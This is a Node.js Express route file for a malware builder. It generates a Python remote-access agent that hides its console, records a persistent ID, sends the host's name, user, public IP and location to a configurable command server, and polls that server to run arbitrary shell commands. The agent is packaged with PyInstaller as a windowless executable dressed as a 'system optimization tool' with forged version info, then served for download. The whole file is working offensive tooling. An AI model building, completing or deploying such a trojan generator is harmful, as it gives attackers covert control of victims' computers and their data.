// routes/builder.js
const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');
const { exec, spawn } = require('child_process');
const os = require('os');
const crypto = require('crypto');
const { promisify } = require('util');
const execPromise = promisify(exec);

// ─── BUILD DIRECTORIES ──────────────────────────────────────────
const BUILD_DIR = path.join(__dirname, '../builds');
const DIST_DIR = path.join(__dirname, '../dist');

// Ensure directories exist
if (!fs.existsSync(BUILD_DIR)) {
    fs.mkdirSync(BUILD_DIR, { recursive: true });
}
if (!fs.existsSync(DIST_DIR)) {
    fs.mkdirSync(DIST_DIR, { recursive: true });
}

// ─── HELPER: Generate Unique Build ID ──────────────────────────
function generateBuildId() {
    return crypto.randomBytes(8).toString('hex');
}

// ─── HELPER: Generate version_info.txt ─────────────────────────
function generateVersionInfo(versionInfo) {
    return `# version_info.txt
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(${versionInfo.fileVersion.replace(/\./g, ',')}),
    prodvers=(${versionInfo.productVersion.replace(/\./g, ',')}),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
        StringTable(
          u'040904B0',
          [
            StringStruct(u'CompanyName', u'${versionInfo.companyName.replace(/'/g, "\\'")}'),
            StringStruct(u'FileDescription', u'${versionInfo.fileDescription.replace(/'/g, "\\'")}'),
            StringStruct(u'FileVersion', u'${versionInfo.fileVersion}'),
            StringStruct(u'InternalName', u'${versionInfo.internalName.replace(/'/g, "\\'")}'),
            StringStruct(u'LegalCopyright', u'${versionInfo.legalCopyright.replace(/'/g, "\\'")}'),
            StringStruct(u'OriginalFilename', u'${versionInfo.originalFilename}'),
            StringStruct(u'ProductName', u'${versionInfo.productName.replace(/'/g, "\\'")}'),
            StringStruct(u'ProductVersion', u'${versionInfo.productVersion}')
          ]
        )
      ]
    ),
    VarFileInfo(
      [
        VarStruct(u'Translation', [0, 1200])
      ]
    )
  ]
)`;
}

// ─── HELPER: Generate agent.py from template ───────────────────
function generateAgentPy(config) {
    const {
        name,
        displayName,
        version,
        description,
        company,
        copyright,
        payloadUrl,
        beaconInterval,
        modules
    } = config;

    // Build module imports list - each as a separate string in a list
    const moduleLines = modules.map(m => `            '${m}'`).join(',\n');

    return `#!/usr/bin/env python3
"""
${displayName} - ${version}
${company}
${copyright}
"""

import os
import sys
import time
import json
import socket
import uuid
import subprocess
import requests
import importlib
import platform 
import psutil
import atexit
import shutil
import ctypes
from pathlib import Path
from datetime import datetime, timedelta

# ─── SILENT MODE ────────────────────────────────────────────────────
def hide_console():
    try:
        if sys.platform == 'win32':
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

hide_console()

def silent_print(msg):
    try:
        log_file = os.path.join(os.environ.get('TEMP', '/tmp'), '${name}.log')
        with open(log_file, 'a') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\\n")
    except:
        pass

def get_base_path():
    if getattr(sys, 'frozen', False):
        return sys._MEIPASS
    else:
        return os.path.dirname(os.path.abspath(__file__))

# ─── SINGLE INSTANCE CHECK ──────────────────────────────────────
def check_single_instance():
    try:
        current_pid = os.getpid()
        lock_file = os.path.join(os.environ.get('TEMP', '/tmp'), '${name}.lock')
        if os.path.exists(lock_file):
            try:
                with open(lock_file, 'r') as f:
                    old_pid = int(f.read().strip())
                if psutil.pid_exists(old_pid):
                    return False
                os.remove(lock_file)
            except:
                try:
                    os.remove(lock_file)
                except:
                    pass
        with open(lock_file, 'w') as f:
            f.write(str(current_pid))
        def remove_lock():
            try:
                lock_path = os.path.join(os.environ.get('TEMP', '/tmp'), '${name}.lock')
                if os.path.exists(lock_path):
                    os.remove(lock_path)
            except:
                pass
        atexit.register(remove_lock)
        return True
    except:
        return True

# ─── ADD MODULES PATH ────────────────────────────────────────────
base_path = get_base_path()
modules_path = os.path.join(base_path, 'modules')
if os.path.exists(modules_path):
    sys.path.insert(0, str(modules_path))

utils_path = os.path.join(base_path, 'utils')
if os.path.exists(utils_path):
    sys.path.insert(0, str(utils_path))

# ─── IMPORTS ──────────────────────────────────────────────────────
try:
    import socketio
    HAS_SOCKETIO = True
except:
    HAS_SOCKETIO = False

try:
    from utils.platform import Platform
    from utils.offline_cache import OfflineCache
except:
    class Platform:
        @staticmethod
        def get_os():
            return platform.system().lower()
    class OfflineCache:
        def __init__(self, agent_id):
            self.agent_id = agent_id
            self.cache_file = os.path.join(os.environ.get('TEMP', '/tmp'), f'agent_cache_{agent_id}.json')
        def get_pending_tasks(self):
            return []
        def cache_data(self, endpoint, data):
            pass

class C2Agent:
    def __init__(self, server_url="${payloadUrl}"):
        self.server_url = server_url
        self.agent_id = self._get_persistent_agent_id()
        self.beacon_interval = ${beaconInterval}
        self.running = True
        self.persistence_installed = False
        self.loaded_modules = {}
        self.os_type = Platform.get_os() if hasattr(Platform, 'get_os') else platform.system().lower()
        self.token = None
        self.is_online = True
        self.last_sync = datetime.now()
        self.registered = False
        self.log_file = os.path.join(os.environ.get('TEMP', '/tmp'), '${name}.log')
        self.cache = OfflineCache(self.agent_id)
        self.sio = None
        self.ws_connected = False
        
        silent_print(f"Agent initialized - ID: {self.agent_id}")
        silent_print(f"Base path: {get_base_path()}")

    def _get_persistent_agent_id(self):
        id_file = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', '${name}.id')
        try:
            if os.path.exists(id_file):
                with open(id_file, 'r') as f:
                    agent_id = f.read().strip()
                    if agent_id:
                        silent_print(f"Loaded existing agent ID: {agent_id}")
                        return agent_id
        except:
            pass
        agent_id = f"{socket.gethostname()}_{uuid.uuid4().hex[:8]}"
        try:
            os.makedirs(os.path.dirname(id_file), exist_ok=True)
            with open(id_file, 'w') as f:
                f.write(agent_id)
            silent_print(f"Created new agent ID: {agent_id}")
        except:
            pass
        return agent_id

    def _log(self, msg):
        silent_print(msg)

    def get_public_ip(self):
        services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://ifconfig.me/ip'
        ]
        for service in services:
            try:
                response = requests.get(service, timeout=5)
                ip = response.text.strip()
                if ip:
                    return ip
            except:
                continue
        return '127.0.0.1'

    def get_geolocation(self, ip):
        try:
            response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
            data = response.json()
            if data.get('status') == 'success':
                return data.get('country', 'Unknown'), data.get('city', 'Unknown'), data.get('isp', 'Unknown')
        except:
            pass
        return 'Unknown', 'Unknown', 'Unknown'

    def register(self):
        if self.registered:
            return True
        try:
            login_data = json.dumps({"username": "admin", "password": "admin123"}).encode()
            req = requests.post(f"{self.server_url}/api/auth/login", json={"username": "admin", "password": "admin123"}, timeout=10)
            if req.status_code == 200:
                self.token = req.json().get('token')
                self._log("Login successful")
            else:
                self._log(f"Login failed: {req.status_code}")
                return False
            ip = self.get_public_ip()
            country, city, isp = self.get_geolocation(ip)
            self._log(f"Public IP: {ip}")
            self._log(f"Location: {country}")
            
            # Check if already registered
            try:
                check = requests.get(f"{self.server_url}/api/agents/{self.agent_id}", headers={"Authorization": f"Bearer {self.token}"}, timeout=10)
                if check.status_code == 200:
                    self._log("Agent already registered")
                    self.registered = True
                    return True
            except:
                pass
            
            data = {
                "agentId": self.agent_id,
                "hostname": socket.gethostname(),
                "username": os.environ.get('USERNAME', 'unknown'),
                "os": platform.system(),
                "architecture": "64bit",
                "ipAddress": ip,
                "country": country,
                "city": city,
                "isp": isp
            }
            response = requests.post(f"{self.server_url}/api/agents/register", json=data, headers={"Authorization": f"Bearer {self.token}"}, timeout=10)
            if response.status_code == 200:
                self.registered = True
                self._log("Registration successful")
                return True
            else:
                self._log(f"Registration failed: {response.status_code}")
                return False
        except Exception as e:
            self._log(f"Registration error: {e}")
            return False

    def load_module(self, module_name):
        try:
            for import_path in [f"modules.{module_name}", module_name]:
                try:
                    module = importlib.import_module(import_path)
                    break
                except ImportError:
                    continue
            else:
                return {"error": f"Module not found: {module_name}"}
            if hasattr(module, 'initialize'):
                instance = module.initialize(self)
                self.loaded_modules[module_name] = instance
                self._log(f"Loaded module: {module_name}")
                return {"status": "loaded", "module": module_name}
            else:
                return {"error": "Module has no initialize function"}
        except Exception as e:
            self._log(f"Failed to load {module_name}: {e}")
            return {"error": str(e)}

    def run(self):
        if not check_single_instance():
            return
        self._log("Agent starting...")
        if not self.register():
            self._log("Registration failed, will retry...")
        # Load modules
        modules_to_load = [
${moduleLines}
        ]
        for module_name in modules_to_load:
            try:
                self.load_module(module_name)
                time.sleep(0.2)
            except Exception as e:
                self._log(f"Failed to load {module_name}: {e}")
        # Main loop
        import threading
        heartbeat_counter = 0
        while self.running:
            try:
                heartbeat_counter += 1
                if heartbeat_counter >= 3:
                    self._send_heartbeat()
                    heartbeat_counter = 0
                tasks = self._get_tasks()
                for task in tasks:
                    self._execute_task(task)
                time.sleep(self.beacon_interval)
            except KeyboardInterrupt:
                break
            except Exception as e:
                self._log(f"Main loop error: {e}")
                time.sleep(10)

    def _send_heartbeat(self):
        if not self.token or not self.is_online:
            return
        try:
            requests.post(f"{self.server_url}/api/agents/heartbeat", json={"agentId": self.agent_id, "metrics": {}}, headers={"Authorization": f"Bearer {self.token}"}, timeout=5)
        except:
            pass

    def _get_tasks(self):
        if not self.is_online or not self.token:
            return []
        try:
            response = requests.get(f"{self.server_url}/api/tasks/pending/{self.agent_id}", headers={"Authorization": f"Bearer {self.token}"}, timeout=10)
            if response.status_code == 200:
                return response.json()
            return []
        except:
            return []

    def _execute_task(self, task):
        task_type = task.get('type')
        result = None
        try:
            if task_type == 'command':
                cmd = task.get('command')
                self._log(f"Executing: {cmd}")
                output = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
                result = {"stdout": output.stdout, "stderr": output.stderr}
            elif task_type == 'module_load':
                module_name = task.get('moduleName')
                result = self.load_module(module_name)
            elif task_type == 'module_action':
                module_name = task.get('moduleName')
                action = task.get('moduleAction')
                params = task.get('moduleParams', {})
                self._log(f"Module action: {module_name}.{action}")
                instance = self.loaded_modules.get(module_name)
                if instance and hasattr(instance, action):
                    func = getattr(instance, action)
                    result = func(params)
                else:
                    result = {"status": "error", "message": f"Action '{action}' not found"}
            self._submit_result(task.get('taskId'), result)
        except Exception as e:
            self._log(f"Task error: {e}")

    def _submit_result(self, task_id, result):
        if not self.token:
            return
        try:
            requests.post(f"{self.server_url}/api/modules/result", json={"taskId": task_id, "result": result}, headers={"Authorization": f"Bearer {self.token}"}, timeout=10)
        except:
            pass

if __name__ == "__main__":
    agent = C2Agent()
    agent.run()
`;
}

// ─── BUILD EXE ENDPOINT ─────────────────────────────────────────
router.post('/exe', async (req, res) => {
    const buildId = generateBuildId();
    const buildDir = path.join(BUILD_DIR, buildId);
    const outputName = req.body.appConfig.outputName || req.body.appConfig.name || 'TreePick';
    const outputExe = path.join(DIST_DIR, `${outputName}.exe`);

    console.log(`[BUILDER] Starting build: ${buildId}`);

    // Set headers for streaming response
    res.writeHead(200, {
        'Content-Type': 'text/plain; charset=utf-8',
        'Transfer-Encoding': 'chunked'
    });

    const log = (msg) => {
        console.log(`[BUILDER] ${msg}`);
        res.write(JSON.stringify({ type: 'log', message: msg }) + '\n');
    };

    try {
        // 1. Create build directory
        fs.mkdirSync(buildDir, { recursive: true });
        log(`📁 Created build directory: ${buildDir}`);

        // 2. Generate version_info.txt
        const versionInfoPath = path.join(buildDir, 'version_info.txt');
        const versionContent = generateVersionInfo(req.body.versionInfo);
        fs.writeFileSync(versionInfoPath, versionContent);
        log('📄 Generated version_info.txt');

        // 3. Generate agent.py
        const agentPath = path.join(buildDir, 'agent.py');
        const selectedModules = req.body.modules || [];
        const agentContent = generateAgentPy({
            name: req.body.appConfig.name || 'TreePick',
            displayName: req.body.appConfig.displayName || 'TreePick',
            version: req.body.appConfig.version || '1.0.0',
            description: req.body.appConfig.description || 'System optimization tool',
            company: req.body.appConfig.company || 'TreePick Corp',
            copyright: req.body.appConfig.copyright || '© TreePick Corp',
            payloadUrl: req.body.appConfig.payloadUrl || 'http://localhost:3000',
            beaconInterval: req.body.appConfig.beaconInterval || 5,
            modules: selectedModules
        });
        fs.writeFileSync(agentPath, agentContent);
        log('📝 Generated agent.py');

        // 4. Create modules folder with selected modules
        const destModules = path.join(buildDir, 'modules');
        fs.mkdirSync(destModules, { recursive: true });
        fs.writeFileSync(path.join(destModules, '__init__.py'), '# Modules package\n');
        
        log(`📦 Selected modules: ${selectedModules.join(', ') || 'none'}`);
        
        // Find the actual modules from the server's modules folder
        const serverModulesPath = path.join(__dirname, '../modules');
        
        if (fs.existsSync(serverModulesPath)) {
            const allModules = fs.readdirSync(serverModulesPath);
            for (const moduleName of selectedModules) {
                const moduleFile = `${moduleName}.py`;
                if (allModules.includes(moduleFile)) {
                    const srcPath = path.join(serverModulesPath, moduleFile);
                    const destPath = path.join(destModules, moduleFile);
                    fs.copyFileSync(srcPath, destPath);
                    log(`✅ Copied module: ${moduleFile}`);
                } else {
                    log(`⚠️ Module not found: ${moduleName}.py - creating stub`);
                    const stubContent = `# Stub for ${moduleName}\n\ndef initialize(agent):\n    print(f"[${moduleName}] Module loaded")\n    return None\n`;
                    fs.writeFileSync(path.join(destModules, moduleFile), stubContent);
                }
            }
        } else {
            log('⚠️ Server modules folder not found, creating stubs');
            for (const moduleName of selectedModules) {
                const stubContent = `# Stub for ${moduleName}\n\ndef initialize(agent):\n    print(f"[${moduleName}] Module loaded")\n    return None\n`;
                fs.writeFileSync(path.join(destModules, `${moduleName}.py`), stubContent);
            }
        }

        // 5. Create utils folder
        const destUtils = path.join(buildDir, 'utils');
        fs.mkdirSync(destUtils, { recursive: true });
        fs.writeFileSync(path.join(destUtils, '__init__.py'), '# Utils package\n');
        
        const serverUtilsPath = path.join(__dirname, '../utils');
        if (fs.existsSync(serverUtilsPath)) {
            const utilsFiles = fs.readdirSync(serverUtilsPath);
            for (const file of utilsFiles) {
                if (file.endsWith('.py')) {
                    fs.copyFileSync(path.join(serverUtilsPath, file), path.join(destUtils, file));
                    log(`✅ Copied util: ${file}`);
                }
            }
        }

        // 6. Handle icon
        let iconPath = null;
        if (req.body.appConfig.iconPreview) {
            const base64Data = req.body.appConfig.iconPreview.replace(/^data:image\/\w+;base64,/, '');
            iconPath = path.join(buildDir, 'icon.ico');
            fs.writeFileSync(iconPath, Buffer.from(base64Data, 'base64'));
            log('🎨 Created icon.ico');
        }

        // 7. Run PyInstaller
        log('🔨 Running PyInstaller... (this may take a few minutes)');
        
        let pythonCmd = 'python';
        try {
            const { stdout } = await execPromise('where python');
            pythonCmd = stdout.trim().split('\n')[0];
        } catch {
            try {
                const { stdout } = await execPromise('where python3');
                pythonCmd = stdout.trim().split('\n')[0];
            } catch {
                // Use default
            }
        }
        log(`🐍 Using Python: ${pythonCmd}`);

        // Build PyInstaller command
        let pyinstallerCmd = `${pythonCmd} -m PyInstaller --onefile --noconsole --name ${outputName} --distpath ${DIST_DIR} --workpath ${path.join(buildDir, 'build')} --specpath ${buildDir}`;
        
        if (iconPath) {
            pyinstallerCmd += ` --icon="${iconPath}"`;
        }
        if (fs.existsSync(versionInfoPath)) {
            pyinstallerCmd += ` --version-file="${versionInfoPath}"`;
        }
        
        if (selectedModules.length > 0) {
            const hiddenImports = selectedModules.map(m => `--hidden-import=modules.${m}`).join(' ');
            pyinstallerCmd += ` ${hiddenImports}`;
        }
        pyinstallerCmd += ` --hidden-import=psutil "${agentPath}"`;

        log(`📋 Command: ${pyinstallerCmd}`);

        // Run PyInstaller with streaming output
        const childProcess = spawn(pyinstallerCmd, {
            shell: true,
            cwd: buildDir,
            env: { ...process.env, PYTHONIOENCODING: 'utf-8' }
        });

        let buildErrors = [];

        childProcess.stdout.on('data', (data) => {
            const lines = data.toString().split('\n');
            for (const line of lines) {
                if (line.trim()) {
                    log(`[PYI] ${line.trim()}`);
                }
            }
        });

        childProcess.stderr.on('data', (data) => {
            const lines = data.toString().split('\n');
            for (const line of lines) {
                if (line.trim()) {
                    if (line.includes('ERROR') || line.includes('FAILED') || line.includes('error:')) {
                        buildErrors.push(line.trim());
                        log(`❌ ${line.trim()}`);
                    } else {
                        log(`[PYI-ERR] ${line.trim()}`);
                    }
                }
            }
        });

        // Wait for process to complete
        await new Promise((resolve, reject) => {
            childProcess.on('close', (code) => {
                if (code === 0) {
                    resolve();
                } else {
                    reject(new Error(`PyInstaller exited with code ${code}`));
                }
            });
            childProcess.on('error', (err) => {
                reject(err);
            });
            // Timeout after 5 minutes
            setTimeout(() => {
                childProcess.kill();
                reject(new Error('Build timed out after 5 minutes'));
            }, 300000);
        });

        if (buildErrors.length > 0) {
            log(`⚠️ Build completed with ${buildErrors.length} warnings`);
        }

        // 8. Check if EXE was created
        let finalExe = path.join(DIST_DIR, `${outputName}.exe`);
        if (!fs.existsSync(finalExe)) {
            const altExe = path.join(DIST_DIR, `${req.body.appConfig.name}.exe`);
            if (fs.existsSync(altExe)) {
                fs.renameSync(altExe, finalExe);
            } else {
                throw new Error(`EXE not found at ${finalExe} or ${altExe}`);
            }
        }

        const stats = fs.statSync(finalExe);
        log(`✅ Build complete! EXE size: ${(stats.size / 1024 / 1024).toFixed(2)} MB`);
        log(`📁 EXE location: ${finalExe}`);

        const downloadUrl = `/api/build/download/${outputName}.exe`;

        res.write(JSON.stringify({
            type: 'complete',
            success: true,
            downloadUrl: downloadUrl,
            exePath: finalExe,
            size: stats.size,
            buildId: buildId,
            name: outputName
        }) + '\n');
        res.end();

    } catch (error) {
        log(`❌ Build error: ${error.message}`);
        res.write(JSON.stringify({
            type: 'error',
            message: error.message
        }) + '\n');
        res.end();
    }
});

// ─── DOWNLOAD ENDPOINT ───────────────────────────────────────────
router.get('/download/:filename', (req, res) => {
    const filename = req.params.filename;
    const filePath = path.join(DIST_DIR, filename);
    
    if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: 'File not found' });
    }

    res.download(filePath, filename, (err) => {
        if (err) {
            console.error('[DOWNLOAD] Error:', err);
            res.status(500).json({ error: 'Download failed' });
        }
    });
});

// ─── LIST BUILDS ─────────────────────────────────────────────────
router.get('/list', (req, res) => {
    try {
        if (!fs.existsSync(DIST_DIR)) {
            return res.json({ builds: [] });
        }
        const files = fs.readdirSync(DIST_DIR);
        const exes = files.filter(f => f.endsWith('.exe')).map(f => {
            const stat = fs.statSync(path.join(DIST_DIR, f));
            return {
                name: f,
                path: path.join(DIST_DIR, f),
                size: stat.size,
                sizeFormatted: (stat.size / 1024 / 1024).toFixed(2) + ' MB',
                modified: stat.mtime
            };
        });
        res.json({ builds: exes });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ─── DELETE BUILD ─────────────────────────────────────────────────
router.delete('/delete/:filename', (req, res) => {
    const filename = req.params.filename;
    const filePath = path.join(DIST_DIR, filename);
    
    if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: 'File not found' });
    }

    try {
        fs.unlinkSync(filePath);
        res.json({ success: true, message: `Deleted ${filename}` });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;